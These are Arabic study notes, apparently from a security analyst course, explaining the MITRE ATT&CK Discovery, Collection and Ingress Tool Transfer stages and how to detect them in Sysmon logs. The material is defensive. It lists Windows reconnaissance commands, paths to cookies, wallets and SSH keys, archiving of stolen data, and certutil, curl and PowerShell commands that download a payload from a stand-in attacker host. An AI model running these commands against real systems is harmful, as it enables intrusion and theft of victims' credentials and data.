
# Discovery Overview

## Situational Awareness

بعد أن ينجح المجرمون في الدخول من **الباب الأمامي**، هل يعرفون ما الموجود خلف هذا الباب؟  
غالبًا **لا يعرفون**، لذلك يبدأون بالبحث داخل الغرف.

قد يجدون:

- كنزًا مخفيًا
    
- أو فخًا جاهزًا للتنفيذ
    

نفس الفكرة تحدث في الهجمات السيبرانية.  
المهاجمون بعد الدخول إلى النظام يحتاجون إلى **فهم البيئة التي دخلوا إليها**.

يريدون معرفة:

- قيمة البيئة التي اخترقوها
    
- ما هي الأدوات الأمنية الموجودة التي قد توقف الهجوم
    

هذه العملية تسمى في إطار **MITRE ATT&CK** باسم:

Discovery Tactic

وسيتم تغطيتها في هذا الجزء.

---

# ماذا يحدث عند بدء Discovery؟

بعد حصول المهاجم على **Initial Access**، يقوم بالاتصال بجهاز الضحية.

ثم يبدأ مرحلة **Discovery** ليكتشف معلومات أساسية عن النظام.

المعلومات التي يحاول معرفتها تشمل:

- ما وظيفة الجهاز
    
- ما هي صلاحيات المستخدم
    
- ما هي إعدادات الشبكة
    

---

# Discovery Commands

عند الاستيقاظ من حلم، أول أسئلة قد تسألها هي:

Who am I?  
Where am I?

نفس الشيء يحدث مع المهاجمين.

قد يكون المهاجم أرسل آلاف رسائل **phishing** إلى عناوين بريد كثيرة.  
لكن نجح الاختراق فقط في **بعض الأجهزة** التي يراها لأول مرة.

لذلك يحتاج إلى معرفة **تفاصيل الضحية**.

---

# أنواع المعلومات التي يجمعها المهاجم

## 1️⃣ Files and Folders

الهدف:

معرفة:

- وظيفة الجهاز
    
- طبيعة عمل الضحية
    
- اهتمامات الضحية
    

الأوامر المستخدمة:

type <file>  
Get-Content <file>  
dir <folder>  
Get-ChildItem <folder>

هذه الأوامر تسمح للمهاجم بقراءة الملفات أو عرض محتويات المجلدات.

---

# 2️⃣ Users and Groups

الهدف:

معرفة:

- من يستخدم الجهاز
    
- ما هي صلاحيات المستخدمين
    

الأوامر المستخدمة:

whoami  
net user  
net localgroup  
query user  
Get-LocalUser

هذه الأوامر تعرض معلومات المستخدمين والمجموعات في النظام.

---

# 3️⃣ System and Apps

الهدف:

معرفة:

- وجود ثغرات في النظام
    
- البرامج المثبتة التي قد تحتوي بيانات مهمة
    

الأوامر المستخدمة:

tasklist /v  
systeminfo  
wmic product get name,version  
Get-Service

هذه الأوامر تعرض معلومات عن:

- العمليات الجارية
    
- معلومات النظام
    
- البرامج المثبتة
    
- الخدمات الموجودة في النظام
    

---

# 4️⃣ Network Settings

الهدف:

معرفة ما إذا كان الجهاز جزءًا من **شبكة شركة**.

الأوامر المستخدمة:

ipconfig /all  
netstat -ano  
netsh advfirewall show allprofiles

هذه الأوامر تعرض:

- إعدادات الشبكة
    
- الاتصالات الحالية
    
- إعدادات الجدار الناري
    

---

# 5️⃣ Active Antivirus

الهدف:

معرفة مدى خطورة استمرار الهجوم بدون أن يتم حظره.

الأمر المستخدم:

Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"

هذا الأمر يعرض معلومات عن **برنامج الحماية المضاد للفيروسات** الموجود في النظام.

---

## Discovery Process

يتم تذكيرنا بسلسلة هجوم **phishing** التي تم شرحها في الجزء السابق.

بعد تشغيل **المرفق الخبيث**، يحدث ما يلي:

1. يقوم البرنامج الخبيث بتشغيل أوامر Discovery أساسية.
    
2. الهدف هو التعرف على الضحية.
    
3. في بعض الحالات قد يقوم البرنامج الخبيث **بحذف نفسه** إذا:
    

- كان هناك برنامج مضاد فيروسات محدد
    
- أو إذا لم تكن الضحية من شركة أو دولة مستهدفة
    

بعد ذلك:

يتصل البرنامج الخبيث مرة أخرى بالمهاجم.

هذا الاتصال يمنح المهاجم **تحكمًا كاملاً في جهاز الضحية**.

---

# كيف يتحكم المهاجم في الضحية

بعد نجاح الاتصال، يستطيع المهاجم التحكم في الجهاز.

المثال المعروض يظهر:

وحدة تحكم المهاجم التي تستقبل اتصالًا من الضحية.

في هذه الحالة يحصل المهاجم على **وصول إلى CMD** على جهاز الضحية.

وبذلك يمكنه كتابة أوامر **Discovery إضافية** إذا احتاج إلى معلومات أخرى.


--------------------------------------------------------------------------------------------------------------------------------------------------------------


# Detecting Discovery

## الفكرة العامة

بعد أن يقوم المهاجم بعملية **Initial Access** ويصل إلى الجهاز، يبدأ مرحلة تسمى:

Discovery

وهدفها هو **فهم البيئة (Environment)** التي اخترقها.

المهاجم يريد معرفة:

- من هو المستخدم الحالي
    
- ما هي الصلاحيات
    
- إعدادات الشبكة
    
- البرامج والخدمات الموجودة
    

ولهذا يستخدم **Discovery Commands**.

---

# Discovery via CMD

أكثر طريقة شائعة لعمل **Discovery** هي عبر:

Command Line (CMD)

وذلك لأن المهاجم يستطيع استخدام **Built-in Windows commands** الموجودة في كل أجهزة Windows.

أمثلة هذه الأوامر:

whoami  
ipconfig  
dir  
net user  
tasklist  
wmic

ميزة هذه الطريقة للمهاجم:

No extra tools needed

أي أنه لا يحتاج تحميل أدوات خارجية.

---

# مثال عملية Discovery

في المثال الموجود في النص يوجد ملف خبيث:

invoice.pdf.exe

وهو **Phishing attachment**.

عند تشغيله يبدأ بتنفيذ أوامر Discovery.

---

# Process Tree للهجوم

سيظهر في شكل **Process Tree** كالتالي:

C:\Users\victim\Downloads\invoice.pdf.exe

هذا هو **malware process**.

ثم يقوم بتشغيل:

C:\Windows\System32\cmd.exe

أي أنه يفتح **CMD shell**.

بعد ذلك CMD ينفذ عدة أوامر Discovery.

---

# Discovery Commands المستخدمة

### 1️⃣ ipconfig

ipconfig

الوظيفة:

Show network settings

أي معرفة:

- IP Address
    
- Network configuration
    

---

### 2️⃣ whoami /priv

whoami /priv

الوظيفة:

Show user permissions

أي عرض **Privileges** الخاصة بالمستخدم الحالي.

---

### 3️⃣ dir

dir

الوظيفة:

List current directory

أي عرض **files and folders** في المجلد الحالي.

---

### 4️⃣ net user

net user

الوظيفة:

List all local users

أي عرض **local accounts** الموجودة على الجهاز.

---

### 5️⃣ tasklist /v

tasklist /v

الوظيفة:

Show running processes

أي معرفة **البرامج التي تعمل حالياً**.

---

### 6️⃣ wmic computersystem get model

wmic computersystem get model

الوظيفة:

Query for laptop model

أي معرفة **نوع الجهاز أو موديل الكمبيوتر**.

---

# استخدام PowerShell

الملف الخبيث لا يستخدم فقط CMD بل يمكنه تشغيل:

powershell.exe

ثم تنفيذ أوامر Discovery مثل:

---

### Get-Service

Get-Service

الوظيفة:

List active services

أي عرض **services** التي تعمل على النظام.

---

### Get-MpPreference

Get-MpPreference

الوظيفة:

Check Microsoft Defender settings

أي معرفة إعدادات **Microsoft Defender**.

---

# Discovery via GUI

أحيانًا المهاجم لا يستخدم **command line**.

إذا قام بتسجيل الدخول إلى الجهاز عبر:

RDP

فيمكنه استخدام:

GUI (Graphical Interface)

أي نفس الأدوات التي يستخدمها المستخدم العادي.

مثل:

- System Settings
    
- Apps & Programs
    
- Disk Management
    
- Event Viewer
    

---

# Process Tree في حالة GUI

سيكون **process tree** مختلفًا.

بدلًا من أن يبدأ من malware سيبدأ من:

explorer.exe

وهو **Windows GUI shell**.

---

# العمليات التي قد تظهر

### CMD

C:\Windows\System32\cmd.exe

المهاجم مازال يستطيع استخدام **command line** حتى من GUI.

---

### Computer Management

mmc.exe compmgmt.msc

هذا يفتح:

Computer Management console

---

### Network Adapters

control.exe netconnections

الوظيفة:

List network adapters

أي عرض كروت الشبكة.

---

### Settings Panel

SystemSettings.exe

وهو:

Windows Settings

---

### قراءة ملف

notepad.exe secrets.txt

أي أن المهاجم فتح ملف نصي لقراءة محتواه.

---

### Task Manager

taskmgr.exe

وهو **Task Manager** لمعرفة العمليات الجارية.

---

# Detecting Discovery

لكي يكتشف **defender** وجود Discovery يجب القيام بخطوتين.

---

# الخطوة الأولى

البحث عن:

Discovery command

أو **sequence of commands** تم تشغيلها خلال فترة قصيرة.

---

# أين تظهر هذه الأوامر؟

ستظهر في:

Sysmon logs

وبالتحديد في:

Event ID 1

وهو:

Process Creation

---

كما يمكن أن تظهر في:

PowerShell history file

إذا تم استخدام PowerShell.

---

# ملاحظة مهمة

هناك **عدد كبير من Discovery commands**.

لذلك إذا لم تكن تعرف وظيفة أمر معين يجب استخدام:

Search engine

لمعرفة ماذا يفعل.

---

# الخطوة الثانية

بعد العثور على الأمر يجب معرفة:

Where the command came from

أي **مصدر تنفيذ الأمر**.

---

مثال:

الأمر:

ipconfig

قد يستخدمه:

- IT department
    
- System administrator
    
- Legitimate tools
    

لذلك لا يجب اعتبار كل أمر **هجومًا مباشرة**.



# Collection Overview

## الفكرة العامة

بعد أن ينتهي المهاجم من مرحلة:

Discovery

ويفهم:

- من هو المستخدم
    
- ما هي البيانات الموجودة
    
- ما هي الحماية الموجودة
    

يبدأ مرحلة جديدة تسمى:

Collection

وهدفها:

Collect valuable data

أي **جمع البيانات المهمة من الجهاز المخترق**.

---

# تشبيه السيناريو

النص يشبه الهجوم بعملية **سرقة شقة**.

الخطوات تكون:

1️⃣ المجرم يدخل الشقة  
2️⃣ يكتشف الغرف وما بداخلها  
3️⃣ يعرف أين توجد الأشياء الثمينة  
4️⃣ ثم يأخذ **الكنز الحقيقي**

وهذا يعادل في الأمن السيبراني:

Discovery → Collection

---

# MITRE Tactics المستخدمة

عملية سرقة البيانات تشمل ثلاث مراحل في **MITRE ATT&CK**:

Collection  
Credential Access  
Exfiltration

لكن النص يقول:

To make it simpler, let's treat Credential Access as part of Collection

أي سنعتبر **Credential Access** جزء من **Collection** لتبسيط الفكرة.

---

# ماذا يفعل المهاجم في هذه المرحلة

المهاجم بعد اختراق الجهاز:

Breached Laptop

يقوم بالخطوات التالية:

1️⃣ جمع البيانات المهمة  
2️⃣ وضعها في **archive**  
3️⃣ إرسالها إلى **malicious server**

البيانات التي يتم جمعها قد تكون:

- Access keys
    
- Web sessions
    
- Confidential data
    

---

# Collection Targets

الأهداف تختلف حسب **هدف المهاجم (Attackers' goals)**.

النص يقسمها إلى ثلاث فئات.

---

# الهدف الأول: الابتزاز

Goal: Blackmail Victim

المهاجم يبحث عن معلومات شخصية مثل:

- الصور
    
- المحادثات
    
- سجل التصفح
    

أماكنها في النظام قد تكون:

C:\Users\<user>\AppData\Roaming\Signal\*

هذا المجلد يحتوي:

Signal chat data

وأيضًا:

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

وهذا الملف يحتوي:

Browser history

---

# الهدف الثاني: سرقة المال

Goal: Steal Money

المهاجم يبحث عن:

- Web banking sessions
    
- Crypto wallets
    

مثال:

C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat

هذا الملف يحتوي:

Bitcoin wallet data

وأيضًا:

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

وهذا يحتوي:

Web session cookies

والتي قد تسمح للمهاجم بالدخول إلى الحسابات بدون كلمة مرور.

---

# الهدف الثالث: سرقة بيانات الشركات

Goal: Steal Corporate Data

المهاجم يبحث عن:

- SSH credentials
    
- Databases
    

مثال:

C:\Users\<user>\.ssh\*

هذا المجلد يحتوي:

SSH private keys

والتي تستخدم للاتصال بالخوادم.

مثال آخر:

C:\Program Files\Microsoft SQL Server\...\DATA\*

هذا يحتوي:

Database files

---

# مكان تخزين الأسرار

النص يوضح أن البيانات الحساسة ليست دائمًا **files فقط**.

قد تكون مخزنة أيضًا في:

Registry

أو داخل:

Process Memory

---

# Exfiltrating Data

بعد جمع البيانات تأتي مرحلة:

Exfiltration

وهي:

Uploading stolen data to attacker server

أي **إرسال البيانات المسروقة إلى المهاجم**.

---

# طريقتان لعمل Collection

## الطريقة الأولى: Scripts

يمكن تنفيذ العملية تلقائيًا باستخدام:

Scripts

وفي هذه الحالة:

The whole process usually takes less than a minute

أي أقل من دقيقة.

---

## الطريقة الثانية: Human attacker

قد يقوم المهاجم بنفسه بالبحث عن الملفات المهمة.

وفي هذه الحالة قد يستغرق:

Hours

حتى يجد الملفات المهمة.

---

# طرق Exfiltration الشائعة

المهاجم يحاول إرسال البيانات بدون أن يتم اكتشافه.

لذلك يستخدم طرق تبدو **legitimate**.

---

# الطريقة الأولى: Cloud Storage

إرسال البيانات إلى خدمات سحابية مثل:

Dropbox  
Mega  
Amazon S3

لأنها خدمات موثوقة.

---

# الطريقة الثانية: Code Repositories أو Messengers

قد يرسل البيانات إلى:

GitHub  
Telegram

---

# الطريقة الثالثة: Domain مزيف

المهاجم قد ينشئ Domain يبدو شرعيًا مثل:

windows-updates.com

ثم يرسل البيانات إليه.

---

# المطلوب في هذه المهمة

النص يطلب منك متابعة العمل في:

Attached VM

ثم محاولة العثور على:

Data to collect

أي الملفات أو البيانات التي حاول **malware جمعها**.

---------------------
--------------------------------------------------------
---

# Detecting Collection

كما حدث في **Discovery phase**، يمكن للمهاجم تنفيذ **Collection** بطريقتين:

```text
Command-Line
GUI (Graphical Interface)
```

لكن الفرق الأساسي هو:

- في **Discovery** المهاجم يبحث عن **system information**
    
- في **Collection** المهاجم يبحث عن **specific sensitive files**
    

أي:

```text
Discovery → System information
Collection → Sensitive files and secrets
```

---

# كيف نكتشف Collection

يمكن اكتشاف Collection عبر مراقبة **file access commands**.

أي أوامر تقوم بـ:

- قراءة ملفات
    
- البحث داخل ملفات
    
- نسخ ملفات
    
- ضغط الملفات
    

---

# أمثلة على أوامر Collection

## 1️⃣ قراءة ملف حساس

مثال:

```bash
notepad.exe C:\Users\<user>\Desktop\finances-2025.csv
```

المعنى:

المهاجم استخدم **Notepad** لفتح ملف مالي.

الوصف في النص:

```text
Threat actors used Notepad to check content of the interesting file
```

---

# 2️⃣ البحث عن كلمة password

مثال:

```bash
CMD: type debug-logs.txt | findstr password > C:\Temp\passwords.txt
```

ما يحدث هنا:

1️⃣ `type` يعرض محتوى الملف  
2️⃣ `findstr password` يبحث عن كلمة **password**  
3️⃣ `>` يحفظ النتائج في ملف جديد

النتيجة:

```text
C:\Temp\passwords.txt
```

الوصف:

```text
Threat actors searched for the "password" keyword in a specific file
```

---

# 3️⃣ البحث عن ملفات PDF

مثال:

```powershell
Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf
```

المعنى:

- `Get-ChildItem` = list files
    
- `-Recurse` = البحث داخل كل المجلدات
    
- `*.pdf` = البحث عن ملفات PDF
    

الوصف:

```text
Threat actors searched for PDF files in the user's home folder
```

---

# 4️⃣ نسخ ملفات الدردشة

مثال:

```powershell
copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\
```

المعنى:

المهاجم نسخ:

```text
Signal chat history
```

إلى مجلد:

```text
Temp
```

الوصف:

```text
Threat actors copied Signal chat history
```

---

# 5️⃣ ضغط البيانات المسروقة

مثال:

```powershell
Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip
```

المعنى:

ضغط كل الملفات في:

```text
C:\Temp\
```

إلى ملف:

```text
stolen_data.zip
```

الوصف:

```text
Preparing for exfiltration
```

---

# 6️⃣ استخدام 7-Zip

بدل PowerShell يمكن استخدام برنامج ضغط مثل **7-Zip**.

مثال:

```bash
7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*
```

المعنى:

- `a` = add files
    
- `-tzip` = نوع الأرشيف zip
    
- `C:\Temp\*.*` = جميع الملفات
    

الوصف:

```text
Threat actors can use existing archiving software
```

---

# Collection Examples

في المثال المذكور في النص:

المهاجم قام بعمل **Manual Collection**.

الخطوات كانت:

1️⃣ فتح الملفات باستخدام:

```text
Notepad
Wordpad
```

2️⃣ قراءة ملفات مثل:

- financial records
    
- sensitive documents
    

3️⃣ ثم ضغطها باستخدام:

```text
7-Zip
```

---

# كيف تم اكتشاف الهجوم

تم اكتشافه عبر:

```text
Sysmon Event ID 1
```

وهو:

```text
Process Creation
```

حيث ظهرت عمليات مثل:

- notepad.exe
    
- wordpad.exe
    
- 7za.exe
    

---

# Data Stealers

في الهجمات الكبيرة:

```text
Human attacker
```

يقوم بجمع البيانات يدويًا.

لكن في الأجهزة الشخصية غالبًا يتم استخدام:

```text
Data Stealer
```

وهو:

```text
Specialized malware
```

يقوم تلقائيًا بـ:

- collection
    
- exfiltration
    

---

# مثال Data Stealer

النص يذكر مثال:

```text
Gremlin data stealer
```

وهو ملف خبيث واحد يقوم بسرقة:

- VPN profiles
    
- Crypto wallets
    
- Browser sessions
    
- Steam accounts
    
- Discord data
    
- Telegram data
    
- Screenshots
    

---

# ملاحظة مهمة

النص يقول:

```text
Data stealers rarely use CMD or PowerShell
```

أي أنهم غالبًا **لا يستخدمون أوامر النظام**.

بدل ذلك يستخدمون:

```text
their own code
```

وهذا يجعل معرفة **البيانات المسروقة أصعب**.

---

# شرح الكود في الصورة

الكود الظاهر هو جزء من **stealer malware**.

الدالة اسمها:

```csharp
GetData()
```

وظيفتها:

```text
Find Telegram data folder
```

---

# تحليل الكود

### تحديد مسار Telegram

السطر:

```csharp
Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
```

يرجع المسار:

```text
C:\Users\<user>\AppData\Roaming
```

ثم يضيف:

```text
\Telegram Desktop\tdata
```

إذن المسار النهائي:

```text
C:\Users\<user>\AppData\Roaming\Telegram Desktop\tdata
```

وهذا هو مكان **Telegram session data**.

---

# فحص هل Telegram يعمل

السطر:

```csharp
Process.GetProcessesByName("Telegram")
```

يقوم بالبحث عن **Telegram process**.

---

# الشرط

```csharp
if (processesByName.Length == 0)
```

المعنى:

إذا كان Telegram **غير مفتوح**.

فإن الدالة تعيد:

```text
Default Telegram data path
```

---

# إذا كان Telegram يعمل

الكود يستخدم:

```csharp
ProcessExecutablePath()
```

ليعرف:

```text
Telegram installation path
```

ثم يحصل على:

```text
tdata folder
```

---

# الهدف من الكود

سرقة:

```text
Telegram session files
```

لأنها قد تسمح للمهاجم بـ:

```text
Login without password
```

---

# الخلاصة

**Collection detection** يعتمد على مراقبة:

1️⃣ File access commands  
2️⃣ File copy operations  
3️⃣ Archive creation  
4️⃣ Suspicious processes

لكن **Data Stealers** غالبًا لا تستخدم أوامر النظام، بل تستخدم **malware code** مثل الكود الذي يحاول سرقة:

```text
Telegram tdata
```

---
------------------
--------------
---

# Ingress Tool Transfer

## الفكرة الأساسية

في بداية أي هجوم غالبًا **المهاجم لا يمتلك كل الأدوات داخل الجهاز المخترق**.

مثلاً:

- قد يدخل عبر **Phishing attachment**
    
- أو عبر **RDP session**
    

لكن هذا الدخول يكون عادة **بأداة صغيرة جدًا**.

لذلك يحتاج المهاجم لاحقًا إلى **تحميل أدوات إضافية**.

هذه العملية تسمى في MITRE:

```text
Ingress Tool Transfer
```

أي:

```text
Downloading additional tools to the compromised system
```

---

# لماذا يحتاج المهاجم تحميل أدوات

المهاجم قد يحتاج أدوات لتنفيذ مراحل أخرى من الهجوم مثل:

### 1️⃣ أدوات Discovery

مثل أداة:

```text
Seatbelt
```

وظيفتها:

```text
Automate system discovery
```

أي جمع معلومات عن النظام والثغرات.

---

### 2️⃣ أدوات سرقة كلمات المرور

مثل:

```text
Mimikatz
```

وظيفتها:

```text
Extract saved passwords
```

أو استخراج **OS credentials**.

---

### 3️⃣ أدوات التحكم بالجهاز

مثل:

```text
Remcos RAT
```

وهو:

```text
Remote Access Trojan
```

يسمح للمهاجم بالتحكم الكامل بالجهاز.

---

### 4️⃣ Ransomware

في بعض الهجمات بعد سرقة البيانات يتم تحميل:

```text
Ransomware
```

لـ:

```text
Encrypt the system
```

---

# لماذا لا يضع المهاجم كل الأدوات في ملف واحد

النص يوضح سببين رئيسيين:

### 1️⃣ تجاوز Antivirus

تقسيم malware إلى عدة أجزاء يساعد في:

```text
Bypass antivirus detection
```

---

### 2️⃣ تقليل الخطر

إذا تم اكتشاف الهجوم مبكرًا:

```text
Minimize exposure
```

أي تقليل كشف الأدوات الحقيقية للمهاجم.

---

# طرق نقل الأدوات (Transfer Methods)

هناك عدة طرق لتحميل malware إلى الجهاز المخترق.

---

# 1️⃣ باستخدام Certutil

مثال:

```cmd
certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
```

المعنى:

- تحميل الملف من الموقع
    
- حفظه باسم:
    

```text
good.exe
```

---

# 2️⃣ باستخدام Curl

في Windows 10 أصبح **curl** متوفرًا افتراضيًا.

مثال:

```cmd
curl.exe https://blackhat.thm/bad.exe -o good.exe
```

المعنى:

- تحميل الملف
    
- حفظه باسم good.exe
    

---

# 3️⃣ باستخدام PowerShell

مثال:

```powershell
powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"
```

الأمر المستخدم هنا:

```text
Invoke-WebRequest
```

ويتم اختصاره غالبًا إلى:

```text
IWR
```

---

# 4️⃣ باستخدام GUI

لا يحتاج المهاجم دائمًا إلى CMD.

يمكنه ببساطة:

- فتح **Browser**
    
- تحميل الملف
    
- أو نسخ الملفات عبر **RDP**
    

---

# Detecting Tool Transfer

اكتشاف هذه العملية يعتمد على:

```text
Network activity
```

لأن تحميل الأدوات يحتاج:

- Network connection
    
- DNS request
    

---

# ماذا يجب مراقبته

عند التحقيق يجب تحليل ثلاثة أشياء:

### 1️⃣ Process

أي برنامج قام بالاتصال.

مثال:

```text
curl.exe
powershell.exe
certutil.exe
```

---

### 2️⃣ Destination Domain

أي الموقع الذي تم الاتصال به.

مثال:

```text
blackhat.thm
```

---

### 3️⃣ Downloaded File

الملف الذي تم تحميله.

مثال:

```text
bad.exe
```

---

# ملاحظة مهمة

المهاجم قد يستخدم مواقع **شرعية** مثل:

- GitHub
    
- Cloud storage
    

لذلك لا يجب الاعتماد فقط على **domain reputation**.

بل يجب تحليل:

```text
Process + Domain + File
```

---

# شرح الصورة

الصورة تعرض **Event chain داخل Sysmon logs**.

سنمشي خطوة خطوة.

---

# الحدث 1: تشغيل CMD

في البداية يتم تشغيل:

```text
cmd.exe
```

هذا يظهر في:

```text
Sysmon Event ID 1
```

وهو:

```text
Process Create
```

---

# الحدث 2: تشغيل Curl

بعدها CMD يقوم بتشغيل:

```text
curl.exe
```

وهذا أيضًا يظهر في:

```text
Sysmon Event ID 1
```

---

# الحدث 3: تحميل الملف

بعد تشغيل curl يتم تحميل الملف.

ويظهر في Sysmon كـ:

```text
Event ID 11
```

وهو:

```text
File Created
```

أي أن الملف تم حفظه على الجهاز.

---

# الحدث 4: الاتصال بالموقع

بعد ذلك يحدث:

```text
DNS Query
```

ويظهر في:

```text
Event ID 22
```

مثلاً الاتصال بـ:

```text
blackhat.thm
```

---
![[Pasted image 20260310150325.png]]

# ملاحظة في الصورة

النص يقول:

```text
Connection to blackhat.thm (delayed event)
```

أي أن **DNS event** قد يظهر بعد أحداث أخرى في اللوج.

وهذا طبيعي في **log timelines**.

---

# مثال الأمر في الصورة

الأمر المستخدم هو:

```cmd
curl.exe http://blackhat.thm/bad.exe -o good.exe
```

المعنى:

- تحميل الملف:
    

```text
bad.exe
```

- حفظه باسم:
    

```text
good.exe
```

---

# تسلسل الهجوم بالكامل

من الصورة يمكن تلخيص التسلسل كالتالي:

```text
1. CMD is launched
2. Curl.exe starts download
3. File is downloaded
4. DNS connection to blackhat.thm
```

---

# الخلاصة

**Ingress Tool Transfer** يعني:

```text
Downloading additional tools after initial compromise
```

ويتم عادة باستخدام:

- certutil
    
- curl
    
- powershell
    
- browser
    

ويتم اكتشافه عبر تحليل:

```text
Sysmon Event ID 1
Sysmon Event ID 11
Sysmon Event ID 22
```

---

